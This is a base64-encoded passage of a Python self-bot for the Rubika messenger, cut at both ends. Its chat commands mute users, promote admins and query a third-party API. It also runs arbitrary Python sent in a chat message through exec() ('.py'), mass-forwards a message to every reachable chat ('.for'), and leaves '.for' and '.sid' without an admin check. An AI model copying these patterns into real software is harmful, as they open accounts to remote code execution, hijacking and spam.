AgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KGYi8J2ZiPCdmarwnZmP8J2ZmiDwnZi/8J2ZmvCdmaHwnZma8J2Zj/CdmZrwnZi/XG57Y29tbWFuZH0iKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgaWYgdGV4dC5zdGFydHN3aXRoKCIucm11dGUiKSBhbmQgZ3VpZCA9PSBhZG1pbnM6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBpZHMgPSBhd2FpdCBjbGllbnQobWV0aG9kcy5tZXNzYWdlcy5HZXRNZXNzYWdlc0J5SUQob2JqZWN0cyxtZXNzYWdlX2lkcz1yZXBseSkpCiAgICAgICAgICAgICAgICAgICAgICAgIHVzID0gYXdhaXQgY2xpZW50KG1ldGhvZHMudXNlcnMuR2V0VXNlckluZm8oaWRzLmF1dGhvcl9vYmplY3RfZ3VpZCkpCiAgICAgICAgICAgICAgICAgICAgICAgIG11dGUuYXBwZW5kKHVzLnVzZXIudXNlcl9ndWlkKQogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5yZXBseShmIvCdmYjwnZmq8J2Zj/CdmZog8J2ZjvCdmZrwnZmPXG5Ae3VzLnVzZXIudXNlcm5hbWV9IikKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgIGlmIHRleHQuc3RhcnRzd2l0aCgiLnJkbXV0ZSIpIGFuZCBndWlkID09IGFkbWluczoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGlkcyA9IGF3YWl0IGNsaWVudChtZXRob2RzLm1lc3NhZ2VzLkdldE1lc3NhZ2VzQnlJRChvYmplY3RzLG1lc3NhZ2VfaWRzPXJlcGx5KSkKICAgICAgICAgICAgICAgICAgICAgICAgdXMgPSBhd2FpdCBjbGllbnQobWV0aG9kcy51c2Vycy5HZXRVc2VySW5mbyhpZHMuYXV0aG9yX29iamVjdF9ndWlkKSkKICAgICAgICAgICAgICAgICAgICAgICAgbXV0ZS5yZW1vdmUodXMudXNlci51c2VyX2d1aWQpCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KGYi8J2ZiPCdmarwnZmP8J2ZmiDwnZi/8J2ZmvCdmaHwnZma8J2Zj/CdmZrwnZi/XG5Ae3VzLnVzZXIudXNlcm5hbWV9IikKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MgICAgICAgCgoKICAgICMgICAgICAgICAgICAgICBbIFRPT0xTIF0gICAgICAgICAjCgoKICAgICAgICAgICAgICAgIGlmIHRleHQuc3RhcnRzd2l0aCgi2KfYryIpIGFuZCBndWlkID09IGFkbWluczoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGV2ZW50LnR5cGUgPT0gIkdyb3VwIjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlkcyA9IGF3YWl0IGNsaWVudChtZXRob2RzLm1lc3NhZ2VzLkdldE1lc3NhZ2VzQnlJRChvYmplY3RzLG1lc3NhZ2VfaWRzPXJlcGx5KSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzID0gYXdhaXQgY2xpZW50KG1ldGhvZHMudXNlcnMuR2V0VXNlckluZm8oaWRzLmF1dGhvcl9vYmplY3RfZ3VpZCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBjbGllbnQobWV0aG9kcy5ncm91cHMuU2V0R3JvdXBBZG1pbihvYmplY3RzLHVzLnVzZXIudXNlcl9ndWlkLGFjY2Vzc19saXN0PVsnUGluTWVzc2FnZXMnLCdEZWxldGVHbG9iYWxBbGxNZXNzYWdlcyddKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KGYiWyB7dXMudXNlci5maXJzdF9uYW1lfV0oe3VzLnVzZXIudXNlcl9ndWlkfSkg2KfYryDYtNiv24wg8J+MlvCfkqsiKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICAgICAgICAgIGlmIHRleHQuc3RhcnRzd2l0aCgiLmlkIikgYW5kIGd1aWQgPT0gYWRtaW5zOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZXZlbnQudHlwZSA9PSAiR3JvdXAiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWRzID0gYXdhaXQgY2xpZW50KG1ldGhvZHMubWVzc2FnZXMuR2V0TWVzc2FnZXNCeUlEKG9iamVjdHMsbWVzc2FnZV9pZHM9cmVwbHkpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXMgPSBhd2FpdCBjbGllbnQobWV0aG9kcy51c2Vycy5HZXRVc2VySW5mbyhpZHMuYXV0aG9yX29iamVjdF9ndWlkKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmVkaXQoZiJge3VzLnVzZXIudXNlcl9ndWlkfWBcblsge3VzLnVzZXIuZmlyc3RfbmFtZX1dKHt1cy51c2VyLnVzZXJfZ3VpZH0pIikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZXZlbnQudHlwZSA9PSAiVXNlciI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cyA9IGF3YWl0IGNsaWVudChtZXRob2RzLnVzZXJzLkdldFVzZXJJbmZvKG9iamVjdHMpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQuZWRpdChmJ2B7dXMudXNlci51c2VyX2d1aWR9YCcpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgICAgICAgICAgaWYgdGV4dC5zdGFydHN3aXRoKCIuZ2V0bGluayIpIGFuZCBndWlkID09IGFkbWluczoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGV2ZW50LnR5cGUgPT0gIkdyb3VwIjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpbmtzID0gYXdhaXQgY2xpZW50KG1ldGhvZHMuZ3JvdXBzLkdldEdyb3VwTGluayhvYmplY3RzKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KGYiIiIK2YTbjNmG2qkg2q/YsdmI2Ycg8J+MlvCfkqsKCioqTElOS1MqKiB7bGlua3Muam9pbl9saW5rfQogICAgIiIiKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICAgICAgICAgIGlmIHRleHQuc3RhcnRzd2l0aCgiLmluZm8iKSBhbmQgZ3VpZCA9PSBhZG1pbnM6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBncm91cHMgPSBhd2FpdCBjbGllbnQobWV0aG9kcy5ncm91cHMuR2V0R3JvdXBJbmZvKG9iamVjdHMpKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBncm91cHMuZ3JvdXAuZXZlbnRfbWVzc2FnZXMgPT0gVHJ1ZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRleHRzID0gIlllcyIKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRleHRzID0gIk5vIgogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5lZGl0KGYiIiIK4oCiIPCdlIrwnZSv8J2UrPCdlLLwnZSTIPCdlIfwnZSe8J2UsfCdlJ4g4oCiCgrihJXwnZWS8J2VhPCdlZY6IHtncm91cHMuZ3JvdXAuZ3JvdXBfdGl0bGV9CvCdlYTwnZWW8J2VnvCdlZPwnZWW8J2Vo/CdlaQ6IHtncm91cHMuZ3JvdXAuY291bnRfbWVtYmVyc30K8J2Uu/CdlZbwnZWk8J2VlPCdlaPwnZWa8J2VofCdlaXwnZWa8J2VoPCdlZ86IHtncm91cHMuZ3JvdXAuZGVzY3JpcHRpb259CvCdlYvwnZWW8J2VqfCdlaUg8J2Uu/CdlaDwnZWf8J2VpSDwnZWK8J2VlvCdlZbwnZWfOiB7Z3JvdXBzLmNoYXQuY291bnRfdW5zZWVufQrwnZS48J2VlPCdlZTwnZWW8J2VpPCdlaQg8J2VhPCdlZbwnZWk8J2VpPCdlZLwnZWY8J2Vljoge3RleHRzfQrwnZWK8J2VnfCdlaDwnZWoIPCdlYTwnZWg8J2VlfCdlZY6IHtncm91cHMuZ3JvdXAuc2xvd19tb2RlfXMKICAgICIiIikKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgIGlmIHRleHQuc3RhcnRzd2l0aCgiLnBpbmciKSBhbmQgZ3VpZCA9PSBhZG1pbnM6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBwaW5nID0gZ2V0KGYiaHR0cHM6Ly9hcGkuY29kZWJhemFuLmlyL3BpbmcvP3VybD13d3cue3RleHQucmVwbGFjZSgnLnBpbmcgJywnJykuc3RyaXAoKX0iKS50ZXh0CiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmVkaXQoZiLwnZmL8J2ZnvCdmaPwnZmC8J2ZqCDwnZmO8J2ZnvCdmY/wnZmaIDoge3Bpbmd98J2XoPCdmIAiKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgaWYgdGV4dC5zdGFydHN3aXRoKCIuYmlvIikgYW5kIGd1aWQgPT0gYWRtaW5zOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgdXJsID0gZ2V0KCJodHRwczovL2FwaS5jb2RlYmF6YW4uaXIvYmlvLyIpLnRleHQKICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQuZWRpdChmIuKAoiDwnZi98J2ZnvCdmaQg8J2ZjfCdmZbwnZmj8J2Yv/CdmaTwnZmiIOKAoiBcbnt1cmx9IikKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgICAgICBpZiB0ZXh0LnN0YXJ0c3dpdGgoIi5mb250ICIpIGFuZCBndWlkID09IGFkbWluczoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHVybCA9IGdldChmImh0dHBzOi8vYXBpLmNvZGViYXphbi5pci9mb250Lz90ZXh0PXt0ZXh0LnJlcGxhY2UoJy5mb250JywnJyl9IikuanNvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmVkaXQoZiJcbiIuam9pbihsaXN0KHVybFsicmVzdWx0Il0udmFsdWVzKCkpWzoxMTBdKSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgIGlmIHRleHQuc3RhcnRzd2l0aCgiLmRhdGUiKSBhbmQgZ3VpZCA9PSBhZG1pbnM6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICB1cmwgPSBqc29uLmxvYWRzKGdldChmImh0dHA6Ly9hcGkuY29kZWJhemFuLmlyL3RpbWUtZGF0ZS8/anNvbj1lbiIpLnRleHQpCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmVkaXQoZiIiIgrigKIg8J2Ul/CdlKbwnZSQ8J2UovCdlJYg8J2Uh/CdlJ7wnZSX8J2UoiDigKIKCvCdlYvwnZWa8J2VnvCdlLzwnZWkOiB7dXJsWydyZXN1bHQnXVsndGltZSddfQrwnZS78J2VkvCdlYvwnZWWOiB7dXJsWydyZXN1bHQnXVsnZGF0ZSddfQrwnZS98J2VkvCdlaTwnZWdOiB7dXJsWydyZXN1bHQnXVsnZmFzbCddfQrwnZWE8J2VkvCdlZk6IHt1cmxbJ3Jlc3VsdCddWydtYWhuYW1lJ119CvCdlY7wnZWW8J2VlvCdlZzihJXwnZWS8J2VnvCdlZY6IHt1cmxbJ3Jlc3VsdCddWyd3ZWVrbmFtZSddfQoKICAgICAgICAgICAgICAgICAgICAiIiIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICBpZiB0ZXh0LnN0YXJ0c3dpdGgoIi5saXN0IikgYW5kIGd1aWQgPT0gYWRtaW5zOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgaHlwZXIgPSBvcGVuKCJNb2RlL0h5cGVyIikucmVhZCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGNvcHkgID0gb3BlbigiTW9kZS9jb3B5IikucmVhZCgpCiAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwID0gb3BlbigiTW9kZS9Hcm91cCIpLnJlYWQoKQogICAgICAgICAgICAgICAgICAgICAgICBMb2NrICA9IG9wZW4oIk1vZGUvTG9jayIpLnJlYWQoKQogICAgICAgICAgICAgICAgICAgICAgICBUYWdzICA9IG9wZW4oIk1vZGUvVGFncyIpLnJlYWQoKQogICAgICAgICAgICAgICAgICAgICAgICBUZXh0MiA9IG9wZW4oIk1vZGUvdGV4dDIiKS5yZWFkKCkKICAgICAgICAgICAgICAgICAgICAgICAgVElNRSAgPSBvcGVuKCJNb2RlL1RJTUUiKS5yZWFkKCkKICAgICAgICAgICAgICAgICAgICAgICAgQm9sZCAgPSBvcGVuKCJNb2RlL0JvbGQiKS5yZWFkKCkKICAgICAgICAgICAgICAgICAgICAgICAgc2VlbnMgPSBvcGVuKCJNb2RlL1NlZW4iKS5yZWFkKCkKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZXMgPSBvcGVuKCJNb2RlL0dhbWUiKS5yZWFkKCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICB0cGluZyA9IG9wZW4oIk1vZGUvVHlwaW5nIikucmVhZCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmVkaXQoZiIiIgrigKIg8J2XoPCdl7LwnZe78J2YgiDwnZef8J2XtvCdmIDwnZiBIOKAogoK8J2Zt/CdmqLwnZqZ8J2ajvCdmps6IHtoeXBlcn0K8J2ZsvCdmpjwnZqZ8J2aojoge2NvcHl9CvCdmbbwnZqb8J2amPCdmp7wnZqZOiB7R3JvdXB9CvCdmbvwnZqY8J2ajPCdmpQ6IHtMb2NrfQrwnZqD8J2aivCdmpDwnZqcOiB7VGFnc30K8J2ag/Cdmo7wnZqh8J2anfCdn7g6IHtUZXh0Mn0K8J2ag/CdmpLwnZm88J2ajjoge1RJTUV9CvCdmbHwnZqY8J2alfCdmo06IHtCb2xkfQoqKlNFRU4qKjoge3NlZW5zfQoqKlR5cGluZyoqOiB7dHBpbmd9CiAgICAiIiIpICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDogCiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgIGlmIHRleHQuc3RhcnRzd2l0aCgiLmNsZWFyIik6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBoeXBlciA9IG9wZW4oIk1vZGUvSHlwZXIiLCJ3Iikud3JpdGUoIm9mZiIpCiAgICAgICAgICAgICAgICAgICAgICAgIGNvcHkgID0gb3BlbigiTW9kZS9jb3B5IiwidyIpLndyaXRlKCJvZmYiKQogICAgICAgICAgICAgICAgICAgICAgICBHcm91cCA9IG9wZW4oIk1vZGUvR3JvdXAiLCJ3Iikud3JpdGUoIm9mZiIpCiAgICAgICAgICAgICAgICAgICAgICAgIExvY2sgID0gb3BlbigiTW9kZS9Mb2NrIiwidyIpLndyaXRlKCJvZmYiKQogICAgICAgICAgICAgICAgICAgICAgICBUYWdzICA9IG9wZW4oIk1vZGUvVGFncyIsInciKS53cml0ZSgib2ZmIikKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dDIgPSBvcGVuKCJNb2RlL3RleHQyIiwidyIpLndyaXRlKCJvZmYiKQogICAgICAgICAgICAgICAgICAgICAgICBUSU1FICA9IG9wZW4oIk1vZGUvVElNRSIsInciKS53cml0ZSgib2ZmIikKICAgICAgICAgICAgICAgICAgICAgICAgQm9sZCAgPSBvcGVuKCJNb2RlL0JvbGQiLCJ3Iikud3JpdGUoIm9mZiIpCiAgICAgICAgICAgICAgICAgICAgICAgIHNlZW5zID0gb3BlbigiTW9kZS9TZWVuIiwidyIpLndyaXRlKCJvZmYiKQogICAgICAgICAgICAgICAgICAgICAgICBnYW1lcyA9IG9wZW4oIk1vZGUvR2FtZSIsInciKS53cml0ZSgib2ZmIikKICAgICAgICAgICAgICAgICAgICAgICAgdHBpbmcgPSBvcGVuKCJNb2RlL1R5cGluZyIsInciKS53cml0ZSgib2ZmIikKICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQuZWRpdChmIiIiCuKAoiBDbGVhciBBbGwgTWV0aG9kcyBDSVBIRVItWCAKCgrigKIgU3VjY2Vzc2Z1bGx5IOKAogoK4oCiIPCdl6DwnZey8J2Xu/CdmIIg4oCiCgrwnZm38J2aovCdmpnwnZqO8J2amzogb2ZmCvCdmbLwnZqY8J2amfCdmqI6IG9mZgrwnZm28J2am/CdmpjwnZqe8J2amTogb2ZmCvCdmbvwnZqY8J2ajPCdmpQ6IG9mZgrwnZqD8J2aivCdmpDwnZqcOiBvZmYK8J2ag/Cdmo7wnZqh8J2anfCdn7g6IG9mZgrwnZqD8J2akvCdmbzwnZqOOiBvZmYK8J2ZsfCdmpjwnZqV8J2ajTogb2ZmCioqU0VFTioqOiBvZmYKKipUeXBpbmcqKjogb2ZmICAgICAgICAgICAgICAgICAgICAgCiIiIikKCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICBpZiB0ZXh0LnN0YXJ0c3dpdGgoIi5mb3IiKToKICAgICAgICAgICAgICAgICAgICBkaWFsb2dzID0gYXdhaXQgY2xpZW50KG1ldGhvZHMuY2hhdHMuR2V0Q2hhdHMoc3RhcnRfaWQ9Tm9uZSkpCiAgICAgICAgICAgICAgICAgICAgaWYgZGlhbG9ncy5jaGF0czoKICAgICAgICAgICAgICAgICAgICAgICAgdG90YWwgPSBsZW4oZGlhbG9ncy5jaGF0cykKICAgICAgICAgICAgICAgICAgICAgICAgc3VjY2Vzc2Z1bCA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgdW5zdWNjZXNzZnVsID0gMAogICAgICAgICAgICAgICAgICAgICAgICBtZXNzYWdlID0gYXdhaXQgZXZlbnQucmVwbHkoZifYqti52K/Yp9ivIHt0b3RhbH0g2obYqiDZvtuM2K/YpyDYtNivINi02LHZiNi5INmB2LHYp9uM2YbYryDYp9ix2LPYp9mEIC4uLicpCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpbmRleCwgZGlhbG9nIGluIGVudW1lcmF0ZShkaWFsb2dzLmNoYXRzLCBzdGFydD0xKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG1ldGhvZHMuZ3JvdXBzLlNlbmRNZXNzYWdlcyBpbiBkaWFsb2cuYWNjZXNzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZXZlbnQudHlwZSA9PSAiR3JvdXAiIG9yIGV2ZW50LnR5cGUgPT0gIlVzZXIiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQuZm9yd2FyZHMoZGlhbG9nLm9iamVjdF9ndWlkLCBtZXNzYWdlX2lkcz1ldmVudC5yZXBseV9tZXNzYWdlX2lkKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VjY2Vzc2Z1bCArPSAxCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVuc3VjY2Vzc2Z1bCArPSAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9ncmVzcyA9ICd8JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGxlZCA9IGludChpbmRleCAqIDE1IC8gdG90YWwpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvZ3Jlc3MgKz0gJ+KWiCcgKiBmaWxsZWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9ncmVzcyArPSAnLScgKiAoMTUgLSBmaWxsZWQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvZ3Jlc3MgKz0gJ3wg4paF4paD4paBJyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9ncmVzcyArPSBmJyBbe2ludChpbmRleCAqIDEwMCAvIHRvdGFsKTosfSVdJwogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBtZXNzYWdlLmVkaXQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYn2KrYudiv2KfYryB7aW5kZXg6LH0g2obYqiDYp9iyIHt0b3RhbDosfSDahtiqINio2LHYsdiz24wg2LTYr9mHINin2LPYqicKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZidcbtmF2YjZgdmCIDoge3N1Y2Nlc3NmdWw6LH1cbtmG2KfZhdmI2YHZgjoge3Vuc3VjY2Vzc2Z1bDosfVxuXG57cHJvZ3Jlc3N9JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5yZXBseSgn2K/YsSDYrNiz2KrYrNmI24wg2obYqiDZh9inINio2Kcg2LTaqdiz2Kog2YXZiNin2KzYudmHINi02K8nKQogICAgICAgICAgICAgICAgaWYgdGV4dC5zdGFydHN3aXRoKCIucnVuIikgYW5kIGd1aWQgPT0gYWRtaW5zOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgcnVuLmFwcGVuZChvYmplY3RzKQogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5yZXBseShldmVudCkKCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiRVJSIGxpbmUgOTMwIikKICAgICAgICAgICAgICAgIGlmIG9iamVjdHMgaW4gcnVuOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZXZlbnQpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiRVJSIikgICAgCiAgICAgICAgICAgICAgICBpZiB0ZXh0LnN0YXJ0c3dpdGgoIi5zaWQiKToKICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gdGV4dC5yZXBsYWNlKCIuc2lkIiwiIikuc3RyaXAoKQogICAgICAgICAgICAgICAgICAgIGF3YWl0IGNsaWVudChtZXRob2RzLnNldHRpbmdzLlVwZGF0ZVVzZXJuYW1lKHVzZXJuYW1lPWNvbW1hbmQpKQogICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KGYiKipTRVQgWW91ciBJRCoqIC0+IGB7Y29tbWFuZH1gIikKCiAgICAgICAgICAgICAgICBpZiB0ZXh0LnN0YXJ0c3dpdGgoIi5weSIpIGFuZCBndWlkID09IGFkbWluczoKICAgICAgICAgICAgICAgICAgICBDb2RlID0gdGV4dC5yZXBsYWNlKCIucHlcbiIsIiIpCiAgICAgICAgICAgICAgICAgICAgb2xkX3N0ZGVyciA9IHN5cy5zdGRlcnIKICAgICAgICAgICAgICAgICAgICBvbGRfc3Rkb3V0ID0gc3lzLnN0ZG91dAogICAgICAgICAgICAgICAgICAgIHJlZGlyZWN0ZWRfb3V0cHV0ID0gc3lzLnN0ZG91dCA9IGlvLlN0cmluZ0lPKCkKICAgICAgICAgICAgICAgICAgICByZWRpcmVjdGVkX2Vycm9yID0gc3lzLnN0ZGVyciA9IGlvLlN0cmluZ0lPKCkKICAgICAgICAgICAgICAgICAgICBzdGRvdXQsIHN0ZGVyciwgZXhjID0gTm9uZSwgTm9uZSwgTm9uZQogICAgICAgICAgICAgICAgICAgIGFzeW5jIGRlZiBhZXhlYyhjb2RlLCBldmVudCk6CiAgICAgICAgICAgICAgICAgICAgICAgIGV4ZWMoCiAgICAgICAgICAgICAgICAgICAgICAgIGYiYXN5bmMgZGVmIF9fYWV4ZWMoZXZlbnQsIGNsaWVudCk6ICIKICAgICAgICAgICAgICAgICAgICAgICAgKyAiXG4gY2hhdGlkID0gZXZlbnQub2JqZWN0X2d1aWQiCiAgICAgICAgICAgICAgICAgICAgICAgICsgIiIuam9pbihmIlxuIHtsfSIgZm9yIGwgaW4gY29kZS5zcGxpdCgiXG4iKSksCiAgICAgICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGF3YWl0IGxvY2FscygpWydfX2FleGVjJ10oZXZlbnQsY2xpZW50KQogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuZWQgPSBhd2FpdCBhZXhlYyhDb2RlLGV2ZW50KQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICAgICAgICAgIGV4YyA9IHRyYWNlYmFjay5mb3JtYXRfZXhjKCkKICAgICAgICAgICAgICAgICAgICBzdGRvdXQgPSByZWRpcmVjdGVkX291dHB1dC5nZXR2YWx1ZSgpLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICBzdGRlcnIgPSByZWRpcmVjdGVkX2Vycm9yLmdldHZhbHVlKCkuc3RyaXAoKQogICAgICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQgPSBvbGRfc3Rkb3V0CiAgICAgICAgICAgICAgICAgICAgc3lzLnN0ZGVyciA9IG9sZF9zdGRlcnIKICAgICAgICAgICAgICAgICAgICBldmFsdWF0aW9uID0gZXhjIG9yIHN0ZGVyciBvciBzdGRvdXQgb3IgcmV0dXJuZWQKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGV2YWx1YXRpb246CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5lZGl0KCIqKlF1ZXJ5Kio6XG5cbiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYie0NvZGV9XG5cbiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJcbioqUmVzdWx0Kio6IFxuXG4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIntldmFsdWF0aW9ufSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICIiKQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQuZWRpdCgiKipRdWVyeSoqOlxuXG4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmIntDb2RlfSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJcblJlc3VsdDogXG5ObyBSZXN1bHQgUmV0dXJuZWQvRmFsc2UiKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZXJyOgogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5lZGl0KCIqKlF1ZXJ5Kio6XG4iCiAgICAgICAgICAgICAgICAgICAgICAgIGYie0NvZGV9IgogICAgICAgICAgICAgICAgICAgICAgICAiXG5FeGNlcHRpb246XG4iCiAgICAgICAgICAgICAgICAgICAgICAgIGYie2Vycn0iKQogICAgICAgICAgICAgICAgaWYgdGV4dCA9PSAiLmRlbGFsbCIgYW5kIGd1aWQgPT0gYWRtaW5zOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgQ2hhdCA9IGF3YWl0IGNsaWVudChtZXRob2RzLm1lc3NhZ2VzLkdldE1lc3NhZ2VzKG9iamVjdF9ndWlkPWV2ZW50Lm9iamVjdF9ndWlkLHNvcnQ9IkZyb21NaW4iLG1pbl9pZD1Ob25lLG1heF9pZD1Ob25lLGxpbWl0PTEwLHR5cGU9Tm9uZSkpCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpIGluIENoYXQubWVzc2FnZXM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBpLmF1dGhvcl9vYmplY3RfZ3VpZCA9PSBhZG1pbnM6CiAgICAgICAgICAgICAg